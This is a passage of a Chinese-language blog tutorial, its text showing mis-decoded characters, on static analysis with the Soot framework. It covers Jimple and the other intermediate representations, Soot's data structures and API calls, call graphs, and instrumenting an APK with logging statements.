<code>TaintDroid</code>ã€‚</p>
<h1 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h1><p>ç»™å®šä¸€ä¸ªè¾“å…¥ç¨‹åºï¼Œè¾“å‡ºç¨‹åºçš„å±æ€§ã€‚</p>
<h1 id="Soot"><a href="#Soot" class="headerlink" title="Soot"></a>Soot</h1><p><code>soot</code>æœ‰å¾ˆå¤š<code>Option</code>é…ç½®ï¼Œå¯ä»¥å‚è€ƒ<a target="_blank" rel="noopener" href="https://soot-oss.github.io/soot/docs/4.4.0-SNAPSHOT/options/soot_options.html#options">è¿™é‡Œ</a>æˆ–è€…<a target="_blank" rel="noopener" href="https://github.com/Sable/soot/wiki/Introduction:-Soot-as-a-command-line-tool">è¿™é‡Œ</a>ã€‚</p>
<h2 id="IR"><a href="#IR" class="headerlink" title="IR"></a>IR</h2><h3 id="Jimple"><a href="#Jimple" class="headerlink" title="Jimple"></a>Jimple</h3><p>ä»‹äº <code>Java</code> å’Œ <code>Java</code> å­—èŠ‚ç ä¹‹é—´ï¼Œæ˜¯ä¸€ä¸ªåŸºäºè¯­å¥çš„ã€ç±»å‹åŒ–çš„ï¼ˆæ¯ä¸ªå˜é‡éƒ½æœ‰ä¸€ä¸ªç±»å‹ï¼‰å’Œ <code>3-addressed</code>ï¼ˆæ¯ä¸ªè¯­å¥æœ€å¤šæœ‰ 3 ä¸ªå˜é‡ï¼‰çš„ä¸­é—´è¡¨ç¤ºã€‚</p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>) r0 := <span class="meta">@this</span>: FizzBuzz</span><br><span class="line">(<span class="number">2</span>) i0 := <span class="meta">@parameter0</span>: <span class="type">int</span></span><br><span class="line">(<span class="number">3</span>) $i1 = i0 % <span class="number">15</span></span><br><span class="line">(<span class="number">4</span>) <span class="keyword">if</span> $i1 != <span class="number">0</span> <span class="type">goto</span> <span class="variable">$i2</span> <span class="operator">=</span> i0 % <span class="number">5</span></span><br><span class="line">(<span class="number">5</span>) $r4 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">6</span>) virtualinvoke $r4.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(java.lang.String)</span>&gt;(<span class="string">&quot;FizzBuzz&quot;</span>)</span><br><span class="line">(<span class="number">7</span>) <span class="keyword">goto</span> [?= <span class="keyword">return</span>]</span><br><span class="line">(<span class="number">8</span>) $i2 = i0 % <span class="number">5</span></span><br><span class="line">(<span class="number">9</span>) <span class="keyword">if</span> $i2 != <span class="number">0</span> <span class="type">goto</span> <span class="variable">$i3</span> <span class="operator">=</span> i0 % <span class="number">3</span></span><br><span class="line">(<span class="number">10</span>) $r3 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">11</span>) virtualinvoke $r3.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(java.lang.String)</span>&gt;(<span class="string">&quot;Buzz&quot;</span>)</span><br><span class="line">(<span class="number">12</span>) <span class="keyword">goto</span> [?= <span class="keyword">return</span>]</span><br><span class="line">(<span class="number">13</span>) $i3 = i0 % <span class="number">3</span></span><br><span class="line">(<span class="number">14</span>) <span class="keyword">if</span> $i3 != <span class="number">0</span> <span class="type">goto</span> <span class="variable">$r1</span> <span class="operator">=</span> &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">15</span>) $r2 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">16</span>) virtualinvoke $r2.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(java.lang.String)</span>&gt;(<span class="string">&quot;Fizz&quot;</span>)</span><br><span class="line">(<span class="number">17</span>) <span class="keyword">goto</span> [?= <span class="keyword">return</span>]</span><br><span class="line">(<span class="number">18</span>) $r1 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">19</span>) virtualinvoke $r1.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(<span class="type">int</span>)</span>&gt;(i0)</span><br><span class="line">(<span class="number">20</span>) <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<h3 id="Shimple"><a href="#Shimple" class="headerlink" title="Shimple"></a>Shimple</h3><p>ä¸<code>Jimple</code>åŸºæœ¬ç›¸åŒï¼Œæ˜¯<code>Jimple</code>é™æ€å•ä»»åŠ¡å½¢å¼çš„ä¸­é—´è¡¨ç¤ºã€‚</p>
<h3 id="Baf"><a href="#Baf" class="headerlink" title="Baf"></a>Baf</h3><p>æ˜¯æµçº¿å‹çš„åŸºäºæ ˆçš„å­—èŠ‚è¡¨ç¤ºã€‚å°†<code>java</code>å­—èŠ‚ç è½¬ä¸ºåŸºäºæ ˆçš„ä»£ç ã€‚</p>
<h3 id="Grimp"><a href="#Grimp" class="headerlink" title="Grimp"></a>Grimp</h3><p>ä¸<code>Jimple</code> ç±»ä¼¼ï¼Œæ¯”<code>Jimple</code>æ›´æ¥è¿‘äº<code>java</code>æºç ã€‚å®¹æ˜“é˜…è¯»ï¼Œæ–¹ä¾¿äººå·¥é˜…è¯»ã€‚</p>
<h2 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h2><p>åŸºæœ¬çš„æ•°æ®ç»“æ„å¦‚ä¸‹ï¼š</p>
<ul>
<li><p><code>Scene</code>ï¼Œæ˜¯ä¸€ä¸ªå•ä¾‹ç±»ï¼Œè¡¨ç¤ºæ‰€åˆ†æçš„ç¯å¢ƒã€‚</p>
</li>
<li><p><code>SootClass</code>ï¼Œç”¨äºè¡¨ç¤º<code>Scene</code>ä¸­çš„ç±»ã€‚</p>
</li>
<li><p><code>SootMethod</code>ï¼Œç”¨äºè¡¨ç¤º<code>SootClass</code>ä¸­çš„æ–¹æ³•ã€‚</p>
</li>
<li><p><code>Body</code>ï¼Œä½¿ç”¨<code>Body</code>æ¥è®¿é—®<code>SootMethod</code>ä¸­çš„å„ç§ä¿¡æ¯ï¼Œæ¯ä¸ª<code>Body</code>é‡Œé¢æœ‰ä¸‰ä¸ªä¸»é“¾ï¼Œåˆ†åˆ«æ˜¯<code>Units</code>é“¾ã€<code>Locals</code>é“¾ã€<code>Traps</code>é“¾ã€‚ã€‚</p>
<ul>
<li><code>Localï¼Œ</code>æ–¹æ³•å†…çš„å±€éƒ¨å˜é‡ã€‚</li>
<li><code>Trap</code>ï¼Œæ–¹æ³•å†…çš„å¼‚å¸¸å¤„ç†ã€‚</li>
<li><code>Unit</code>ï¼Œæ–¹æ³•ä½“å†…çš„è¯­å¥ã€‚</li>
</ul>
</li>
</ul>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/sootarch.png" alt="sootarch"></p>
<p>è¿˜æœ‰å››ç§<code>Body</code>ï¼Œå¯¹åº”å››ç§ä¸­é—´è¡¨ç¤ºï¼š<code>BafBody</code>ã€<code>JimpleBody</code>ã€<code>ShimpleBody</code>ã€<code>GrimpBody</code>ï¼Œ<code>Soot</code> ä¸­çš„é»˜è®¤ <code>IR</code> æ˜¯ **<code>Jimple</code>**ï¼ˆ<code>Java Simple</code>ï¼‰ã€‚</p>
<h3 id="Unitï¼ˆJimpleä¸­æ˜¯Stmtï¼‰"><a href="#Unitï¼ˆJimpleä¸­æ˜¯Stmtï¼‰" class="headerlink" title="Unitï¼ˆJimpleä¸­æ˜¯Stmtï¼‰"></a>Unitï¼ˆJimpleä¸­æ˜¯Stmtï¼‰</h3><p>è¡¨ç¤º<code>Unit</code>è¯­å¥ã€‚ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p>
<ul>
<li>è¿‡ç¨‹å†…æ§åˆ¶æµï¼š<code>NopStmt</code>ï¼Œ<code>IdentityStmt</code>ï¼Œ<code>AssignStmt</code>ã€‚<ul>
<li><code>IdentityStmt</code>ï¼šé€šå¸¸æŒ‡çš„æ˜¯å¯¹å˜é‡èµ‹å€¼ï¼Œè¿™ä¸ªå˜é‡æ—¢å¯ä»¥æ˜¯æ˜¾ç¤ºçš„ä¹Ÿå¯ä»¥æ˜¯éšå¼çš„ã€‚</li>
<li>ä¸€ä¸ª<code>IdentityStmt</code>å°†ç‰¹æ®Šå€¼ï¼Œå¦‚å‚æ•°ã€<code>this</code>æˆ–è¢«æ•è·çš„å¼‚å¸¸ï¼Œåˆ†é…ç»™ä¸€ä¸ª<code>Local</code>ã€‚</li>
<li>æ‰€æœ‰æ­£å¸¸çš„èµ‹å€¼ï¼Œä¾‹å¦‚ä»ä¸€ä¸ª<code>Local</code>åˆ°å¦ä¸€ä¸ª<code>Local</code>ï¼Œæˆ–è€…ä»ä¸€ä¸ª<code>Constant</code>åˆ°ä¸€ä¸ª<code>Local</code>ï¼Œéƒ½æ˜¯ç”¨<code>AssignStmt</code>è¡¨ç¤ºçš„ã€‚</li>
</ul>
</li>
<li>è¿‡ç¨‹é—´çš„æ§åˆ¶æµï¼š<code>IfStmt</code> ï¼Œ <code>GotoStmt</code> ï¼Œ <code>SwitchStmt</code>ï¼Œ<code>InvokeStmt</code>ï¼Œ<code>ReturnStmt</code>ï¼Œ<code>ReturnVoidStmt</code>ï¼Œ <code>ThrowStmt</code>ã€‚</li>
<li>ç›‘æ§è¯­å¥ï¼š<code>MonitorStmt</code>ã€‚</li>
<li>èµ‹å€¼è¯­å¥ï¼š<code>DefinitionStmt</code>ã€‚</li>
<li>å…¶å®ƒç±»å‹ï¼š<code>NopStmt</code>ï¼Œ<code>BreakponitStmt</code>ã€‚</li>
</ul>
<h3 id="Value"><a href="#Value" class="headerlink" title="Value"></a>Value</h3><ul>
<li><code>Local</code></li>
<li><code>Constant</code></li>
<li><code>Ref</code></li>
<li><code>Expr</code></li>
</ul>
<h4 id="Local"><a href="#Local" class="headerlink" title="Local"></a>Local</h4><p><strong>JimpleLocal</strong>ï¼š<code>local</code>å˜é‡</p>
<p><strong>TemporaryRegisterLocal</strong>ï¼š <code>$</code>å¼€å¤´çš„ä¸´æ—¶å˜é‡</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image-20210619180333086.png" alt="image-20210619180333086"></p>
<h4 id="Constant"><a href="#Constant" class="headerlink" title="Constant"></a>Constant</h4><p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image-20210619182313742.png" alt="image-20210619182313742"></p>
<h4 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h4><p><code>ConcreteRef</code>ï¼š</p>
<ul>
<li><code>ArrayRef</code>ï¼šæŒ‡å‘æ•°ç»„ã€‚</li>
<li><code>FieldRef</code>ï¼š æŒ‡å‘<code>field</code>ã€‚<ul>
<li><code>StaticFieldRef </code>ï¼šé™æ€<code>field</code>çš„å¼•ç”¨ã€‚</li>
<li><code>InstanceFieldRef</code> ï¼šæŒ‡å‘çš„<code>field</code>æ˜¯ä¸€ä¸ªå¯¹è±¡å®ä¾‹ã€‚</li>
</ul>
</li>
</ul>
<p><code>IdentityRef</code>ï¼š</p>
<ul>
<li><code>CaughtExcrptionRef </code>ï¼šæŒ‡å‘æ•è·åˆ°çš„å¼‚å¸¸çš„å¼•ç”¨</li>
<li><code>ParameterRef</code>ï¼šå‡½æ•°å‚æ•°çš„å¼•ç”¨</li>
<li><code>ThisRef</code> ï¼š<code>this</code>çš„å¼•ç”¨</li>
</ul>
<h4 id="Expr"><a href="#Expr" class="headerlink" title="Expr"></a>Expr</h4><p>ä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ª<code>Expr</code>å¯ä»¥å¯¹è‹¥å¹²ä¸ª<code>Value</code>è¿›è¡Œä¸€äº›æ“ä½œå¹¶ä¸”è¿”å›å¦ä¸€ä¸ª<code>Value</code>ã€‚åœ¨<code>Jimple</code>ä¸­ï¼Œå¼ºåˆ¶è¦æ±‚æ‰€æœ‰çš„<code>Value</code><strong>æœ€å¤šåŒ…å«ä¸€ä¸ªè¡¨è¾¾å¼</strong>ã€‚</p>
<p><strong><code>Stmt</code>å’Œ<code>Expr</code>çš„åŒºåˆ«</strong>ï¼š<code>Stmt</code>æ²¡æœ‰è¿”å›å€¼ï¼Œ<code>Expr</code>æœ‰è¿”å›å€¼ã€‚</p>
<h3 id="Box"><a href="#Box" class="headerlink" title="Box"></a>Box</h3><p><code>Box</code>æ˜¯æŒ‡é’ˆï¼Œæä¾›äº†å¯¹<code>Soot</code>å¯¹è±¡çš„é—´æ¥è®¿é—®ã€‚<strong>ä¸€ä¸ª<code>Box</code>æä¾›äº†ä¸€ä¸ªé—´æ¥è®¿é—®<code>soot(Unit,Value)</code>çš„å…¥å£</strong>ï¼Œç±»ä¼¼äº<code>Java</code>çš„ä¸€ä¸ªå¼•ç”¨ã€‚å½“<code>Unit</code>åŒ…å«å¦ä¸€ä¸ª<code>Unit</code>çš„æ—¶å€™ï¼Œéœ€è¦é€šè¿‡<code>Box</code>æ¥è®¿é—®ï¼Œ<code>Soot</code> é‡Œæä¾›äº†ä¸¤ç§ç±»å‹çš„<code>Box</code>, ä¸€ä¸ªæ˜¯<code>ValueBox</code>ä¸€ä¸ªæ˜¯<code>UnitBox</code>ã€‚</p>
<ul>
<li><code>ValueBox</code>ï¼ŒæŒ‡å‘<code>Values</code>ï¼š<ul>
<li>å¯¹äºä¸€æ¡<code>Unit</code>æ¥è¯´ï¼Œä»–çš„<code>ValueBox</code>å­˜å‚¨çš„æ˜¯åœ¨è¿™æ¡è¯­å¥å†…éƒ¨æ‰€<strong>ç”¨åˆ°</strong>çš„å’Œ<strong>æ‰€å®šä¹‰</strong>çš„è¯­å¥ã€‚</li>
</ul>
</li>
<li><code>UnitBox</code>ï¼ŒæŒ‡å‘<code>Units</code>ï¼š<ul>
<li>ä»¥<code>goto</code>è¯­å¥ä¸ºä¾‹ï¼Œ<code>UnitBox</code>å…¶å®å­˜çš„å°±æ˜¯<code>goto</code>æ‰€æŒ‡çš„ä¸‹ä¸€è·³èŠ‚ç‚¹ã€‚</li>
<li><code>switch</code>è¯­å¥ï¼Œåˆ™ä¼šåŒ…å«å¾ˆå¤š<code>boxes</code>ã€‚</li>
</ul>
</li>
</ul>
<p>è¿˜éœ€è¦çŸ¥é“ä»¥ä¸‹çš„è§„åˆ™ï¼š</p>
<ul>
<li>**ä¸€ä¸ª<code>Unit</code>å¯ä»¥æœ‰å¤šä¸ª<code>UnitBox</code>ï¼Œä½†æ˜¯æ¯ä¸ª<code>UnitBox</code>åªèƒ½æŒ‡å‘ä¸€ä¸ª<code>Unit</code>**ã€‚<code>GotoStmt</code> éœ€è¦çŸ¥é“ç›®æ ‡çš„<code>Unit</code>æ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥ä¸€ä¸ª<code>Unit</code>ä¼šåŒ…å«å…¶å®ƒçš„<code>UnitBox</code>ï¼Œé€šè¿‡ <code>UnitBox</code>è·å–ä¸‹ä¸€ä¸ª<code>Unit</code>ã€‚</li>
<li>**ä¸€ä¸ª<code>Value</code>å¯ä»¥å¯¹åº”å¤šä¸ª<code>ValueBox</code>ï¼Œä½†æ˜¯ä¸€ä¸ª<code>ValueBox</code>åªèƒ½å¯¹åº”ä¸€ä¸ª<code>Value</code>**ï¼Œå¯¹äºä¸€ä¸ª<code>Unit</code>ï¼Œå¯ä»¥å¾—åˆ°å¾ˆå¤šä¸ª<code>ValueBox</code>ï¼ŒåŒ…å«ç€è¿™æ¡è¯­å¥å†…éƒ¨çš„æ‰€ç”¨åˆ°å’Œæ‰€å®šä¹‰çš„è¯­å¥ã€‚</li>
</ul>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image-20210325104642746.png" alt="image-20210325104642746"></p>
<h2 id="åŸºæœ¬API"><a href="#åŸºæœ¬API" class="headerlink" title="åŸºæœ¬API"></a>åŸºæœ¬API</h2><h3 id="SootClass"><a href="#SootClass" class="headerlink" title="SootClass"></a>SootClass</h3><p>è·å–ä¸€ä¸ªç±»çš„ä¿¡æ¯ï¼Œå¦‚æœç±»æ˜¯åœ¨ä¸€ä¸ªåŒ…é‡Œï¼Œåˆ™åº”è¯¥åŒ…å«å®Œæ•´çš„åŒ…åï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">circleClass = Scene.v().getSootClass(<span class="string">&quot;Circle&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœåˆ†æçš„ç±»ä¸å†<code>Scene</code>ä¸­ï¼Œåˆ™<code>getSootClass</code>å°†è¿”å›ä¸€ä¸ª<code>Phantom</code>ç±»æˆ–è€…æ˜¯å¼‚å¸¸ã€‚<code>Phantom</code>ç±»ä¸å½±å“åˆ†æçš„è¿›è¡Œï¼Œè¿™åœ¨ä¸å…³æ³¨å…¶ä»–æ¨¡å—çš„ä»£ç æ—¶å¾ˆæœ‰ç”¨ã€‚å¦‚æœè¦ç¡®ä¿æŸ¥è¯¢çš„ç±»å­˜åœ¨ï¼Œå¯ä»¥é€šè¿‡<code>getSootClassUnsafe(className, false)</code>ï¼ˆå¦‚æœä¸å­˜åœ¨ï¼Œåˆ™ç»“æœä¸ºç©ºï¼‰æ£€ç´¢å®ƒhæˆ–è€…ä½¿ç”¨<code>circleClass.isPhantom()</code>åˆ¤æ–­å®ƒæ˜¯ä¸æ˜¯ä¸º<code>Phantom</code>ç±»ã€‚</p>
<h3 id="SootField"><a href="#SootField" class="headerlink" title="SootField"></a>SootField</h3><p>ç±»ä¸­åŒ…å«å­—æ®µå’Œæ–¹æ³•ï¼Œé€šè¿‡åç§°å’Œç±»å‹æ¥æŸ¥æ‰¾å®ƒä»¬ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SootField</span> <span class="variable">radiusField</span> <span class="operator">=</span> circleClass.getField(<span class="string">&quot;radius&quot;</span>, IntType.v())</span><br></pre></td></tr></table></figure>

<h3 id="SootMethod"><a href="#SootMethod" class="headerlink" title="SootMethod"></a>SootMethod</h3><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/1_ESTs9adMHZn7oHPWJo5e8w.png" alt="1_ESTs9adMHZn7oHPWJo5e8w" style="zoom:67%;" />

<p>ä¸€èˆ¬æƒ…å†µä¸‹ä½¿ç”¨<code>getMethodByName</code>å³å¯ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">circleClass.getMethodByName(<span class="string">&quot;getCircleCount&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å¯¹äºæ–¹æ³•é‡è½½ï¼Œéœ€è¦ä½¿ç”¨<code>getMethod</code>æ–¹æ³•ï¼Œå¹¶æä¾›<code>Subsignature</code>ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">circleClass.getMethod(<span class="string">&quot;int area(boolean)&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="ä¿®é¥°ç¬¦"><a href="#ä¿®é¥°ç¬¦" class="headerlink" title="ä¿®é¥°ç¬¦"></a>ä¿®é¥°ç¬¦</h3><p>ç±»ã€æ–¹æ³•å’Œå­—æ®µçš„è®¿é—®æ¨¡å¼ï¼š<code>pulic</code>ã€<code>priavet</code>ã€<code>protected</code>ã€<code>final</code>ã€<code>abstract</code>ç­‰ã€‚è¿™äº›ä¿¡æ¯ä¿å­˜åœ¨<code>Modifier</code>ä¸­ï¼Œæ¯”å¦‚ï¼ŒæŸ¥è¯¢ä¸€ä¸ªæ–¹æ³•æ˜¯å¦ä¸ºé™æ€çš„ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Modifier.isStatic(method.getModfiers())</span><br></pre></td></tr></table></figure>

<h3 id="Body"><a href="#Body" class="headerlink" title="Body"></a>Body</h3><p>åœ¨<code>Body</code>ä¸­æœ‰<code>Units</code>ï¼Œ<code>Values</code>ï¼Œ<code>Traps</code>ã€‚</p>
<h3 id="ä¿®æ”¹ä»£ç "><a href="#ä¿®æ”¹ä»£ç " class="headerlink" title="ä¿®æ”¹ä»£ç "></a>ä¿®æ”¹ä»£ç </h3><p><code>Soot</code>å¯ä»¥ä¿®æ”¹æ–¹æ³•çš„<code>Body</code>ã€‚ç„¶åå¯ä»¥ä½¿ç”¨<code>validate</code>æ£€æŸ¥ä¿®æ”¹æ˜¯å¦æ­£ç¡®ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">stmt.apply(<span class="keyword">new</span> <span class="title class_">AbstractStmtSwitch</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">caseIfStmt</span><span class="params">(IfStmt stmt)</span> &#123;</span><br><span class="line">        stmt.setTarget(body.getUnits().getSuccOf(stmt));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">body.validate();</span><br></pre></td></tr></table></figure>

<h2 id="Call-Graph"><a href="#Call-Graph" class="headerlink" title="Call Graph"></a>Call Graph</h2><p>åœ¨ä¸€ä¸ªè°ƒç”¨å›¾ä¸­ï¼ŒèŠ‚ç‚¹æ˜¯æ–¹æ³•ï¼Œæœ‰å‘è¾¹è¡¨ç¤ºæºæ–¹æ³•å¯ä»¥è°ƒç”¨ç›®æ ‡æ–¹æ³•ã€‚åœ¨<code>Soot</code>ä¸­ï¼Œæ¯æ¡è¾¹éƒ½è¢«æ³¨è§£äº†è°ƒç”¨è¯­å¥ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œå…³äºè¿™ä¸ªä¾‹å­ï¼Œæœ‰ä¸€äº›éœ€è¦æ³¨æ„ï¼Œæ–¹æ³• <code>void &lt;clinit&gt;</code> æœ‰ä¸€ä¸ªç¯ï¼Œä½†å®é™…ä¸Šæ²¡æœ‰ä»£ç å¯ä»¥è§¦å‘è¿™æ¡è·¯å¾„ï¼š</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/1_inAT7nX3AJqotw7p2lTdXw.png" alt="1_inAT7nX3AJqotw7p2lTdXw" style="zoom: 50%;" />

<h2 id="APKåˆ†æ"><a href="#APKåˆ†æ" class="headerlink" title="APKåˆ†æ"></a>APKåˆ†æ</h2><p>é¦–å…ˆï¼Œä½¿ç”¨<a target="_blank" rel="noopener" href="https://www.abartel.net/dexpler/"><em>Dexpler</em></a> å°† <code>Dalvik</code> å­—èŠ‚ç è½¬æ¢ä¸º <code>Jimple Body</code>ã€‚ç„¶åå¯ä»¥å¯¹æ•´ä¸ªç¨‹åºè¿›è¡Œè½¬æ¢ã€ä¼˜åŒ–å’Œæ³¨é‡Šã€‚æ¥ä¸‹æ¥ï¼Œ <code>Jimple</code> è½¬æ¢åŒ…å°†åœ¨æ¯ä¸ª <code>Jimple Body</code>ä¸Šè¿è¡Œã€‚æœ€åï¼Œ<code>Soot</code> å°†æ‰€æœ‰ <code>Jimple Body</code>è½¬æ¢ä¸º <code>Baf</code>ï¼ˆ<code>Soot</code> ä¸­çš„ä½çº§ä¸­é—´è¡¨ç¤ºï¼‰ï¼Œå¹¶ä½¿ç”¨ <code>Dexpler</code> å°†æ•´ä¸ªä»£ç ç¼–è¯‘æˆ <code>APK</code>ã€‚</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/1_2E96Cu2BrZhrO74MxHCbTA.png" alt="1_2E96Cu2BrZhrO74MxHCbTA"></p>
<ul>
<li><code>jtp</code>ï¼Œ<code>jimple</code>è½¬æ¢åŒ…ã€‚</li>
<li><code>jop</code>ï¼Œ<code>jimple</code>ä¼˜åŒ–åŒ…ã€‚</li>
<li><code>jap</code>ï¼Œ<code>jimple</code>æ³¨é‡ŠåŒ…ã€‚</li>
</ul>
<p>å…³äºåŒ…çš„å…·ä½“ä¿¡æ¯å¯ä»¥çœ‹<a target="_blank" rel="noopener" href="https://github.com/soot-oss/soot/wiki/Packs-and-phases-in-Soot">è¿™é‡Œ</a>ã€‚</p>
<h3 id="Sootè®¾ç½®"><a href="#Sootè®¾ç½®" class="headerlink" title="Sootè®¾ç½®"></a>Sootè®¾ç½®</h3><p>åˆ†æ<code>APK</code>ä¹‹å‰ï¼Œ<code>Soot</code>è¿˜éœ€è¦è¿›è¡Œä¸€äº›è®¾ç½®ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setupSoot</span><span class="params">(String androidJar, String apkPath, String outputPath)</span> &#123;</span><br><span class="line">    <span class="comment">// Reset the Soot settings (it&#x27;s necessary if you are analyzing several APKs)</span></span><br><span class="line">    G.reset();</span><br><span class="line">    <span class="comment">// Generic options</span></span><br><span class="line">    Options.v().set_allow_phantom_refs(<span class="literal">true</span>);</span><br><span class="line">    Options.v().set_whole_program(<span class="literal">true</span>);</span><br><span class="line">    Options.v().set_prepend_classpath(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// Read (APK Dex-to-Jimple) Options</span></span><br><span class="line">    Options.v().set_android_jars(androidJar); <span class="comment">// The path to Android Platforms</span></span><br><span class="line">    Options.v().set_src_prec(Options.src_prec_apk); <span class="comment">// Determine the input is an APK</span></span><br><span class="line">    Options.v().set_process_dir(Collections.singletonList(apkPath)); <span class="comment">// Provide paths to the APK</span></span><br><span class="line">    Options.v().set_process_multiple_dex(<span class="literal">true</span>);  <span class="comment">// Inform Dexpler that the APK may have more than one .dex files</span></span><br><span class="line">    Options.v().set_include_all(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// Write (APK Generation) Options</span></span><br><span class="line">    Options.v().set_output_format(Options.output_format_dex);</span><br><span class="line">    Options.v().set_output_dir(outputPath);</span><br><span class="line">    Options.v().set_validate(<span class="literal">true</span>); <span class="comment">// Validate Jimple bodies in each transofrmation pack</span></span><br><span class="line">    <span class="comment">// Resolve required classes </span></span><br><span class="line">    Scene.v().addBasicClass(<span class="string">&quot;java.io.PrintStream&quot;</span>,SootClass.SIGNATURES);</span><br><span class="line">    Scene.v().addBasicClass(<span class="string">&quot;java.lang.System&quot;</span>,SootClass.SIGNATURES);</span><br><span class="line">    Scene.v().loadNecessaryClasses();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ¡ˆä¾‹"><a href="#æ¡ˆä¾‹" class="headerlink" title="æ¡ˆä¾‹"></a>æ¡ˆä¾‹</h3><p>åœ¨æ¯ä¸ªæ–¹æ³•ä¸­åŠ å…¥æ—¥å¿—è¾“å‡ºï¼š<code>System.out.println(&quot;Beginning of method: &quot; + METHOD_NAME)</code>ã€‚<code>jimple</code>ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$r1 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">virtualinvoke $r1.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(java.lang.String)</span>&gt;(<span class="string">&quot;&lt;SOOT_TUTORIAL&gt; Beginning of method METHOD_NAME&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="Bodyè½¬æ¢"><a href="#Bodyè½¬æ¢" class="headerlink" title="Bodyè½¬æ¢"></a>Bodyè½¬æ¢</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PackManager.v().getPack(<span class="string">&quot;jtp&quot;</span>).add(<span 